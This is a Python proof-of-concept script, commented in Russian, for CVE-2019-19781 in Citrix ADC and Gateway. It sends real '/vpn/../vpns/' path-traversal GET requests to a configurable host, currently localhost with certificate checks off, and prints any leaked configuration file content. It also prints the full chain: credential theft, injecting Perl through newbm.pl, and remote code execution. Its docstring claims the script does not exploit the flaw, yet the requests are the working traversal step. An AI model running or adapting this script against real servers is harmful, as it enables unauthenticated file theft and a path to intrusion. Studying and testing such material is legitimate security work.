"""
CVE-2019-19781 — Citrix ADC / Gateway Path Traversal + RCE

Уязвимость обхода пути (Directory Traversal) в Citrix Application Delivery
Controller (NetScaler ADC) и Citrix Gateway, позволяющая неаутентифицированному
атакующему читать произвольные файлы и выполнять произвольный код на сервере.

Атакующий отправляет GET-запрос с последовательностью обхода каталога
(../) в URL к эндпоинту /vpn/../vpns/, что позволяет получить доступ
к конфигурационным файлам Citrix (например, nshttp.conf, ns.conf),
содержащим учётные данные и настройки.

CVSS: 9.8 (Critical)
Затронутые продукты: Citrix ADC и Citrix Gateway версий 10.5, 11.1, 12.0, 12.1, 13.0
Исправление: установка патчей от Citrix (CTX267027)

Данный скрипт НЕ эксплуатирует уязвимость, а лишь имитирует
формирование вредоносного HTTP-запроса к условному уязвимому серверу.
"""

import requests

TARGET_HOST = "https://localhost"

TRAVERSAL_PATHS = [
    "/vpn/../vpns/cfg/smb.conf",
    "/vpn/../vpns/portal/scripts/newbm.pl",
]

headers = {
    "User-Agent": "Mozilla/5.0 (compatible; CVE-2019-19781 PoC)",
    "Connection": "close",
}

print("=" * 60)
print("PoC: CVE-2019-19781 (Citrix ADC Path Traversal + RCE)")
print("=" * 60)
print()
print(f"[*] Цель: {TARGET_HOST}")
print("[*] Метод: Directory Traversal через /vpn/../vpns/")
print()

for path in TRAVERSAL_PATHS:
    url = TARGET_HOST + path
    print(f"[*] Запрос: GET {url}")

    try:
        response = requests.get(url, headers=headers, timeout=5, verify=False)

        if response.status_code == 200 and len(response.text) > 0:
            print(f"[+] Ответ {response.status_code} — возможна уязвимость!")
            print(f"[+] Длина ответа: {len(response.text)} байт")
            print(f"[+] Содержимое (первые 200 символов):")
            print(f"    {response.text[:200]}")
        elif response.status_code == 403:
            print(f"[-] Ответ 403 Forbidden — доступ заблокирован (патч установлен).")
        else:
            print(f"[-] Ответ {response.status_code} — уязвимость не подтверждена.")

    except requests.ConnectionError:
        print(f"[!] Не удалось подключиться к {TARGET_HOST}.")
        print("[!] Это демонстрационный скрипт — для реальной проверки")
        print("    необходим работающий Citrix ADC/Gateway.")
    except requests.Timeout:
        print("[!] Таймаут соединения.")

    print()

print("[*] Описание цепочки атаки:")
print("    1. GET /vpn/../vpns/cfg/smb.conf — чтение конфигурации")
print("    2. Получение учётных данных из конфигурационных файлов")
print("    3. POST /vpn/../vpns/portal/scripts/newbm.pl — запись шаблона")
print("       с внедрённым Perl-кодом")
print("    4. Обращение к записанному шаблону — выполнение произвольного кода")
print("    => Удалённое выполнение кода (RCE) без аутентификации")
print()
print("[*] PoC завершён.")